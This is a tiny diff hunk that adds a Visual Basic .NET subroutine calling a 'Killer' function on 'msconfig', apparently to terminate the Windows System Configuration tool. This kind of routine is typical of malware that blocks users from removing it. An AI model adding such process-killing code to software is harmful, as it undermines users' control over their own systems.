@@ -1,0 +1,3 @@
+ Shared Sub F61()
+        Killer("msconfig")
+ End Sub
